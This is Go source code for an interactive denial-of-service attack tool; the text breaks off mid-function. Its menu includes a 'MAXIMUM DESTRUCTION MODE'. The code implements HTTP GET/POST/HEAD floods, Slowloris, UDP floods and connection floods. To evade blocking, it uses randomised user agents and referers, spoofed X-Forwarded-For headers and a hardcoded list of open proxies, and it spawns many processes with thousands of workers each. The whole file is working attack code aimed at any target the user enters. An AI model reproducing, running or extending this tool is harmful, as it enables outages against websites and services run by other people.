package ddos

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"programa/utils"

	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
	psutilnet "github.com/shirou/gopsutil/net"
)

const (
	MAX_CPU_PERCENT   = 80.0
	MAX_MEM_PERCENT   = 80.0
	MAX_NET_PERCENT   = 80.0
	INSTANCE_OVERHEAD = 50 * 1024 * 1024
	CHECK_INTERVAL    = 2 * time.Second
	WORKER_MULTIPLIER = 1000
)

var (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Reset  = "\033[0m"

	successfulHits uint64
	failedHits     uint64
	totalRequests  uint64
	totalBytes     uint64
	attackRunning  bool
	attackMutex    sync.Mutex
	proxyList      []string
	userAgents     []string
	referers       []string
	instances      []*exec.Cmd
	isMainInstance bool
)

func init() {
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
		"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/120.0.0.0 Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; GT-I9300 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		"Mozilla/5.0 (iPad; CPU OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Nexus 5) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.1+ (KHTML, like Gecko) Version/10.1.0.1234 Mobile Safari/537.1+",
		"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_4_11) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22",
		"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		"Mozilla/5.0 (Linux; U; Android 2.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		"Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.1",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36",
		"Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",
		"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; U; Android 5.0.2; en-us; Nexus 5 Build/MRA58N) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		"Mozilla/5.0 (Windows NT 10.0; ARM64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
	}

	referers = []string{
		"https://www.google.com/search?q=",
		"https://www.bing.com/search?q=",
		"https://search.yahoo.com/search?p=",
		"https://duckduckgo.com/?q=",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"https://www.instagram.com/",
		"https://www.youtube.com/",
		"https://www.linkedin.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://www.pinterest.com/",
		"https://www.tiktok.com/",
		"https://www.amazon.com/",
		"https://www.wikipedia.org/",
		"https://www.tumblr.com/",
		"https://www.twitch.tv/",
		"https://www.discord.com/",
		"https://www.whatsapp.com/",
		"https://www.ebay.com/",
		"https://www.medium.com/",
		"https://www.quora.com/",
		"https://www.cnn.com/",
		"https://www.bbc.com/",
		"https://www.foxnews.com/",
		"https://www.msn.com/",
		"https://www.github.com/",
		"https://www.gitlab.com/",
		"https://www.netflix.com/",
	}

	proxyList = []string{
		"http://51.159.115.233:3128",
		"http://178.128.242.26:8080",
		"http://103.83.118.10:55443",
		"http://200.106.184.12:999",
		"http://190.61.88.147:8080",
		"http://103.148.195.22:8080",
		"http://181.129.43.3:8080",
		"http://103.175.46.107:3125",
		"http://190.2.210.139:8080",
		"http://103.76.12.42:80",
		"http://45.142.182.99:8080",
		"http://103.130.218.77:8080",
		"http://200.174.198.86:8080",
		"http://103.19.192.173:80",
		"http://103.14.199.233:8080",
		"http://103.73.102.174:80",
		"http://103.152.112.145:80",
		"http://45.134.26.45:8080",
		"http://103.105.40.182:3128",
		"http://196.191.240.131:80",
		"http://103.21.163.97:6666",
		"http://103.60.173.9:8080",
		"http://103.155.217.1:53281",
		"http://103.115.252.18:80",
		"http://103.143.196.44:80",
		"http://139.99.237.62:80",
		"http://111.90.179.74:8080",
		"http://102.129.249.120:3128",
		"http://146.0.245.104:8080",
		"http://104.154.225.171:3128",
		"http://135.181.77.139:3128",
		"http://38.101.249.97:8080",
		"http://176.62.178.247:47230",
		"http://34.88.78.112:8080",
		"http://49.12.111.179:3128",
		"http://185.103.116.116:8080",
		"http://195.154.55.178:3128",
		"http://198.59.191.234:8080",
		"http://169.0.39.66:8080",
		"http://140.227.29.241:3128",
		"http://140.227.30.177:3128",
		"http://140.227.31.246:3128",
		"http://140.227.59.167:3128",
		"http://140.227.64.38:6666",
		"http://140.227.65.129:6666",
		"http://140.227.69.105:3128",
		"http://140.238.4.90:8080",
		"http://144.91.78.34:8080",
		"http://157.100.250.81:999",
		"http://159.89.200.167:8080",
		"http://170.239.180.76:999",
		"http://176.113.73.104:3128",
	}
}

// normalizeDosTarget accepts a full URL or a bare host/IP (optional :port, IPv6 as ::1 or [::1]:8080).
func normalizeDosTarget(raw string) string {
	s := strings.TrimSpace(raw)
	if s == "" {
		return ""
	}
	low := strings.ToLower(s)
	if strings.HasPrefix(low, "http://") || strings.HasPrefix(low, "https://") {
		return s
	}
	if ip := net.ParseIP(s); ip != nil && ip.To4() == nil {
		s = "[" + s + "]"
	}
	return "http://" + s
}

// hostBypassesHTTPProxy is true for localhost and RFC1918/link-local hosts — HTTP proxies would connect to the proxy machine, not yours.
func hostBypassesHTTPProxy(target string) bool {
	u, err := url.Parse(target)
	if err != nil || u.Hostname() == "" {
		return false
	}
	h := u.Hostname()
	if strings.EqualFold(h, "localhost") {
		return true
	}
	if ip := net.ParseIP(h); ip != nil {
		return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast()
	}
	return false
}

func applyLocalProxyPolicy(target string, useProxies *bool) {
	if *useProxies && hostBypassesHTTPProxy(target) {
		fmt.Printf("%s[i] Proxy rotation disabled: loopback/private targets cannot be reached through external proxies.%s\n", Yellow, Reset)
		*useProxies = false
	}
}

func DoSMenu() {
	reader := bufio.NewReader(os.Stdin)

	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s════════════════════════════════════════════════════%s\n", Blue, Reset)
		fmt.Printf("%s          DoS / DDoS ATTACK MENU%s\n", Green, Reset)
		fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Blue, Reset)

		fmt.Printf("%s[1]  - Standard DoS Attack%s\n", Green, Reset)
		fmt.Printf("%s[2]  - Multi-Method Attack%s\n", Green, Reset)
		fmt.Printf("%s[3]  - %s[FULL POWER] MAXIMUM DESTRUCTION MODE%s\n", Red, Red, Reset)
		utils.PrintReturnOption("4")

		fmt.Printf("\n%sOption: %s", Green, Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			DoSAttack()
		case "2":
			MultiMethodAttack()
		case "3":
			FullPowerAttack()
		case "4":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", Yellow, Reset)
			fmt.Printf("%sPress Enter to continue...%s", Green, Reset)
			reader.ReadString('\n')
		}
	}
}

type ResourceMonitor struct {
	cpuPercent   float64
	memPercent   float64
	netUsageMbps float64
	maxNetMbps   float64
}

type AttackConfig struct {
	Target         string
	Method         string
	Duration       int
	WorkersPerCore int
	UseProxies     bool
	RandomHeaders  bool
	FollowRedirect bool
	InstanceID     int
}

func DoSAttack() {
	isMainInstance = true

	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("\n%s════════════════════════════════════════════════════%s\n", Red, Reset)
	fmt.Printf("%s          ELITE DoS ATTACK TOOL%s\n", Red, Reset)
	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Red, Reset)

	fmt.Printf("%sTarget (URL, hostname, or IP[:port], e.g. 127.0.0.1:8080): %s", Green, Reset)
	target, _ := reader.ReadString('\n')
	target = normalizeDosTarget(target)

	if target == "" {
		fmt.Printf("%s[!] No target specified%s\n", Red, Reset)
		return
	}

	fmt.Printf("\n%sAttack Methods:%s\n", Yellow, Reset)
	fmt.Printf("%s[1] GET Flood%s\n", Green, Reset)
	fmt.Printf("%s[2] POST Flood%s\n", Green, Reset)
	fmt.Printf("%s[3] HEAD Flood%s\n", Green, Reset)
	fmt.Printf("%s[4] Slowloris%s\n", Green, Reset)
	fmt.Printf("%s[5] HTTP Flood (Mixed)%s\n", Green, Reset)
	fmt.Printf("%s[6] UDP Flood%s\n", Green, Reset)
	fmt.Printf("%s[7] SYN Flood%s\n", Green, Reset)

	fmt.Printf("\n%sSelect method [1-7]: %s", Green, Reset)
	methodInput, _ := reader.ReadString('\n')
	methodInput = strings.TrimSpace(methodInput)

	methodMap := map[string]string{
		"1": "GET",
		"2": "POST",
		"3": "HEAD",
		"4": "SLOWLORIS",
		"5": "MIXED",
		"6": "UDP",
		"7": "SYN",
	}

	method := methodMap[methodInput]
	if method == "" {
		method = "GET"
	}

	fmt.Printf("%sDuration in seconds (0 for unlimited): %s", Green, Reset)
	durationInput, _ := reader.ReadString('\n')
	durationInput = strings.TrimSpace(durationInput)
	duration, _ := strconv.Atoi(durationInput)
	if duration < 0 {
		duration = 0
	}

	fmt.Printf("%sUse proxy rotation? (y/n): %s", Yellow, Reset)
	proxyInput, _ := reader.ReadString('\n')
	useProxies := strings.ToLower(strings.TrimSpace(proxyInput)) == "y"
	applyLocalProxyPolicy(target, &useProxies)

	fmt.Printf("\n%s[*] Analyzing system resources...%s\n", Yellow, Reset)
	time.Sleep(1 * time.Second)

	monitor := &ResourceMonitor{}
	updateResourceMonitor(monitor)

	fmt.Printf("%s[i] CPU Usage: %.1f%%%s\n", Blue, monitor.cpuPercent, Reset)
	fmt.Printf("%s[i] RAM Usage: %.1f%%%s\n", Blue, monitor.memPercent, Reset)
	fmt.Printf("%s[i] Network: %.1f Mbps%s\n", Blue, monitor.netUsageMbps, Reset)

	maxInstances := calculateMaxInstances(monitor)

	fmt.Printf("\n%s[*] Optimal instances: %d%s\n", Green, maxInstances, Reset)
	fmt.Printf("%s[*] Workers per core: %d%s\n", Green, WORKER_MULTIPLIER, Reset)
	fmt.Printf("%s[*] Total workers: %d%s\n", Green, maxInstances*runtime.NumCPU()*WORKER_MULTIPLIER, Reset)

	config := AttackConfig{
		Target:         target,
		Method:         method,
		Duration:       duration,
		WorkersPerCore: WORKER_MULTIPLIER,
		UseProxies:     useProxies,
		RandomHeaders:  true,
		FollowRedirect: false,
		InstanceID:     0,
	}

	fmt.Printf("\n%s════════════════════════════════════════════════════%s\n", Red, Reset)
	fmt.Printf("%s             LAUNCHING ATTACK%s\n", Red, Reset)
	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Red, Reset)

	if maxInstances > 1 {
		launchMultipleInstances(maxInstances-1, config)
	}

	launchAttack(config, monitor)
}

func calculateMaxInstances(monitor *ResourceMonitor) int {
	cpuAvailable := (MAX_CPU_PERCENT - monitor.cpuPercent) / 100.0
	memAvailable := (MAX_MEM_PERCENT - monitor.memPercent) / 100.0

	v, _ := mem.VirtualMemory()
	totalMem := int64(v.Total)

	maxByMem := int(float64(totalMem) * memAvailable / float64(INSTANCE_OVERHEAD))
	maxByCPU := int(float64(runtime.NumCPU()) * cpuAvailable)

	if maxByMem < 1 {
		maxByMem = 1
	}
	if maxByCPU < 1 {
		maxByCPU = 1
	}

	maxInstances := maxByMem
	if maxByCPU < maxInstances {
		maxInstances = maxByCPU
	}

	if maxInstances > 10 {
		maxInstances = 10
	}
	if maxInstances < 1 {
		maxInstances = 1
	}

	return maxInstances
}

func launchMultipleInstances(count int, config AttackConfig) {
	if count <= 0 {
		return
	}

	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("%s[!] Failed to get executable path: %v%s\n", Red, err, Reset)
		return
	}

	fmt.Printf("%s[*] Spawning %d additional instances...%s\n", Yellow, count, Reset)

	for i := 1; i <= count; i++ {
		args := []string{
			"--dos-instance",
			"--target", config.Target,
			"--method", config.Method,
			"--duration", strconv.Itoa(config.Duration),
			"--workers", strconv.Itoa(config.WorkersPerCore),
			"--instance-id", strconv.Itoa(i),
		}

		if config.UseProxies {
			args = append(args, "--use-proxies")
		}

		var cmd *exec.Cmd
		cmd = exec.Command(exePath, args...)

		err := cmd.Start()
		if err != nil {
			fmt.Printf("%s[!] Failed to spawn instance %d: %v%s\n", Red, i, err, Reset)
			continue
		}

		instances = append(instances, cmd)
		time.Sleep(200 * time.Millisecond)
	}

	fmt.Printf("%s[✓] Spawned %d instances%s\n", Green, len(instances), Reset)
}

func launchAttack(config AttackConfig, monitor *ResourceMonitor) {
	attackRunning = true
	successfulHits = 0
	failedHits = 0
	totalRequests = 0
	totalBytes = 0

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	startTime := time.Now()

	numWorkers := runtime.NumCPU() * config.WorkersPerCore

	var wg sync.WaitGroup

	fmt.Printf("%s[✓] Attack launched with %d workers%s\n", Green, numWorkers, Reset)
	fmt.Printf("%s[*] Target: %s%s\n", Yellow, config.Target, Reset)
	fmt.Printf("%s[*] Method: %s%s\n", Yellow, config.Method, Reset)
	if config.Duration > 0 {
		fmt.Printf("%s[*] Duration: %d seconds%s\n", Yellow, config.Duration, Reset)
	} else {
		fmt.Printf("%s[*] Duration: Unlimited (Press Ctrl+C to stop)%s\n", Yellow, Reset)
	}
	fmt.Printf("\n%s[*] Press Ctrl+C to stop the attack%s\n\n", Red, Reset)

	go displayLiveStats(startTime)

	go monitorResources(monitor)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			switch config.Method {
			case "GET":
				httpFloodWorker(config, "GET")
			case "POST":
				httpFloodWorker(config, "POST")
			case "HEAD":
				httpFloodWorker(config, "HEAD")
			case "SLOWLORIS":
				slowlorisWorker(config)
			case "MIXED":
				mixedFloodWorker(config)
			case "UDP":
				udpFloodWorker(config)
			case "SYN":
				synFloodWorker(config)
			case "FULL":
				fullMethodWorker(config)
			default:
				httpFloodWorker(config, "GET")
			}
		}(i)
	}

	if config.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(config.Duration) * time.Second)
			sigChan <- syscall.SIGTERM
		}()
	}

	<-sigChan

	attackRunning = false

	fmt.Printf("\n\n%s[*] Stopping attack...%s\n", Yellow, Reset)

	wg.Wait()

	stopAllInstances()

	time.Sleep(1 * time.Second)

	displayFinalStats(startTime)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("\n%sPress Enter to return to menu...%s", Green, Reset)
	reader.ReadString('\n')
}

func httpFloodOnce(config AttackConfig, client *http.Client, method string) {
	req, err := createHTTPRequest(config, method)
	if err != nil {
		atomic.AddUint64(&failedHits, 1)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddUint64(&failedHits, 1)
		atomic.AddUint64(&totalRequests, 1)
		return
	}

	resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		atomic.AddUint64(&successfulHits, 1)
	} else {
		atomic.AddUint64(&failedHits, 1)
	}

	bytesSize := uint64(800)
	if method == "POST" {
		bytesSize = 1824
	}
	atomic.AddUint64(&totalBytes, bytesSize)
	atomic.AddUint64(&totalRequests, 1)
}

func httpFloodWorker(config AttackConfig, method string) {
	client := createHTTPClient(config)
	for attackRunning {
		httpFloodOnce(config, client, method)
	}
}

func mixedFloodWorker(config AttackConfig) {
	methods := []string{"GET", "POST", "HEAD"}
	client := createHTTPClient(config)
	for attackRunning {
		method := methods[rand.Intn(len(methods))]
		httpFloodOnce(config, client, method)
	}
}

func fullMethodWorker(config AttackConfig) {
	methods := []string{"GET", "POST", "HEAD"}
	client := createHTTPClient(config)
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	methodIndex := 0

	for attackRunning {
		select {
		case <-ticker.C:
			methodIndex = (methodIndex + 1) % len(methods)
		default:
			httpFloodOnce(config, client, methods[methodIndex])
		}
	}
}

func slowlorisWorker(config AttackConfig) {
	targetURL, _ := url.Parse(config.Target)
	host := targetURL.Host
	if !strings.Contains(host, ":") {
		if targetURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	for attackRunning {
		conn, err := net.DialTimeout("tcp", host, 5*time.Second)
		if err != nil {
			atomic.AddUint64(&failedHits, 1)
			time.Sleep(1 * time.Second)
			continue
		}

		reqPath := targetURL.Path
		if reqPath == "" {
			reqPath = "/"
		}
		if q := targetURL.RawQuery; q != "" {
			reqPath += "?" + q
		}
		headers := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
			reqPath, targetURL.Host, randomUserAgent())

		conn.Write([]byte(headers))
		atomic.AddUint64(&successfulHits, 1)
		atomic.AddUint64(&totalBytes, uint64(len(headers)))

		for i := 0; i < 100 && attackRunning; i++ {
			headerLine := fmt.Sprintf("X-a: %d\r\n", rand.Int())
			conn.Write([]byte(headerLine))
			atomic.AddUint64(&totalBytes, uint64(len(headerLine)))
			time.Sleep(10 * time.Second)
		}

		conn.Close()
	}
}

func udpFloodWorker(config AttackConfig) {
	targetURL, _ := url.Parse(config.Target)
	host := targetURL.Hostname()
	port := targetURL.Port()
	if port == "" {
		port = "80"
	}

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%s", host, port))
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, 1024)

	for attackRunning {
		rand.Read(payload)
		_, err := conn.Write(payload)
		if err != nil {
			atomic.AddUint64(&failedHits, 1)
		} else {
			atomic.AddUint64(&successfulHits, 1)
			atomic.AddUint64(&totalBytes, 1024)
		}
		atomic.AddUint64(&totalRequests, 1)
	}
}

func synFloodWorker(config AttackConfig) {
	targetURL, _ := url.Parse(config.Target)
	host := targetURL.Host
	if !strings.Contains(host, ":") {
		if targetURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	for attackRunning {
		conn, err := net.DialTimeout("tcp", host, 1*time.Second)
		if err != nil {
			atomic.AddUint64(&failedHits, 1)
		} else {
			atomic.AddUint64(&successfulHits, 1)
			atomic.AddUint64(&totalBytes, 200)
			conn.Close()
		}
		atomic.AddUint64(&totalRequests, 1)
	}
}

func createHTTPClient(config AttackConfig) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 1000,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
	}

	useProxy := config.UseProxies && len(proxyList) > 0 && !hostBypassesHTTPProxy(config.Target)
	if useProxy {
		proxyURL, _ := url.Parse(proxyList[rand.Intn(len(proxyList))])
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if config.FollowRedirect {
				return nil
			}
			return http.ErrUseLastResponse
		},
	}
}

func createHTTPRequest(config AttackConfig, method string) (*http.Request, error) {
	targetURL := config.Target

	if strings.Contains(targetURL, "?") {
		targetURL += "&cache=" + randomString(10)
	} else {
		targetURL += "?cache=" + randomString(10)
	}

	var req *http.Request
	var err error

	if method == "POST" {
		body := strings.NewReader(randomString(1024))
		req, err = http.NewRequest("POST", targetURL, body)
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}

	if err != nil {
		return nil, err
	}

	if config.RandomHeaders {
		req.Header.Set("User-Agent", randomUserAgent())
		req.Header.Set("Referer", randomReferer())
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Pragma", "no-cache")

		if method == "POST" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}

		if rand.Intn(2) == 0 {
			req.Header.Set("X-Forwarded-For", randomIP())
		}
	}

	return req, nil
}

func updateResourceMonitor(monitor *ResourceMonitor) {
	cpuPercents, _ := cpu.Percent(1*time.Second, false)
	if len(cpuPercents) > 0 {
		monitor.cpuPercent = cpuPercents[0]
	}

	vmem, _ := mem.VirtualMemory()
	monitor.memPercent = vmem.UsedPercent

	netStats, _ := psutilnet.IOCounters(false)
	if len(netStats) > 0 {
		monitor.netUsageMbps = float64(netStats[0].BytesSent+netStats[0].BytesRecv) / 1024 / 1024 * 8
	}

	monitor.maxNetMbps = 100.0
}

func monitorResources(monitor *ResourceMonitor) {
	ticker := time.NewTicker(CHECK_INTERVAL)
	defer ticker.Stop()

	for range ticker.C {
		if !attackRunning {
			return
		}

		updateResourceMonitor(monitor)

		if monitor.cpuPercent > MAX_CPU_PERCENT || monitor.memPercent > MAX_MEM_PERCENT {
			// System overload, but continue
		}
	}
}

func displayLiveStats(startTime time.Time) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !attackRunning {
			return
		}

		elapsed := time.Since(startTime)
		requests := atomic.LoadUint64(&totalRequests)
		successful := atomic.LoadUint64(&successfulHits)
		failed := atomic.LoadUint64(&failedHits)

		rps := float64(requests) / elapsed.Seconds()

		fmt.Printf("\r%s[LIVE] Time: %s | Requests: %d | RPS: %.0f | Success: %s%d%s | Failed: %s%d%s",
			Yellow, formatDuration(elapsed), requests, rps,
			Green, successful, Yellow,
			Red, failed, Reset)
	}
}

func displayFinalStats(startTime time.Time) {
	elapsed := time.Since(startTime)
	requests := atomic.LoadUint64(&totalRequests)
	successful := atomic.LoadUint64(&successfulHits)
	failed := atomic.LoadUint64(&failedHits)
	bytes := atomic.LoadUint64(&totalBytes)

	tbps := float64(bytes) * 8 / (1024 * 1024 * 1024 * 1024) / elapsed.Seconds()

	fmt.Printf("\n\n%s════════════════════════════════════════════════════%s\n", Blue, Reset)
	fmt.Printf("%s              ATTACK RESULTS%s\n", Blue, Reset)
	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Blue, Reset)

	fmt.Printf("%s  Total Duration:       %s%s\n", Blue, formatDuration(elapsed), Reset)
	fmt.Printf("%s  Total Requests:       %d%s\n", Blue, requests, Reset)
	fmt.Printf("%s  Requests Per Second:  %.2f%s\n", Blue, float64(requests)/elapsed.Seconds(), Reset)
	fmt.Printf("%s  Successful Hits:      %s%d%s\n", Blue, Green, successful, Reset)
	fmt.Printf("%s  Failed Hits:          %s%d%s\n", Blue, Red, failed, Reset)
	successRate := 0.0
	if requests > 0 {
		successRate = float64(successful) / float64(requests) * 100
	}
	fmt.Printf("%s  Success Rate:         %.2f%%%s\n", Blue, successRate, Reset)
	fmt.Printf("%s  Total Data Sent:      %.2f GB%s\n", Blue, float64(bytes)/(1024*1024*1024), Reset)
	fmt.Printf("%s  Total Throughput:     %s%.4f TBPS%s\n\n", Blue, Green, tbps, Reset)
}

func stopAllInstances() {
	if len(instances) > 0 {
		fmt.Printf("%s[*] Terminating %d instances...%s\n", Yellow, len(instances), Reset)

		for _, cmd := range instances {
			if cmd.Process != nil {
				cmd.Process.Kill()
			}
		}

		instances = []*exec.Cmd{}
	}
}

func randomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomReferer() string {
	return referers[rand.Intn(len(referers))] + randomString(10)
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255),
		rand.Intn(255),
		rand.Intn(255),
		rand.Intn(255))
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func formatDuration(d time.Duration) string {
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
}

func MultiMethodAttack() {
	isMainInstance = true
	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("\n%s════════════════════════════════════════════════════%s\n", Yellow, Reset)
	fmt.Printf("%s       MULTI-METHOD DDoS ATTACK%s\n", Yellow, Reset)
	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Yellow, Reset)

	fmt.Printf("%sTarget (URL, hostname, or IP[:port]): %s", Green, Reset)
	target, _ := reader.ReadString('\n')
	target = normalizeDosTarget(target)

	if target == "" {
		fmt.Printf("%s[!] No target specified%s\n", Red, Reset)
		return
	}

	if hostBypassesHTTPProxy(target) {
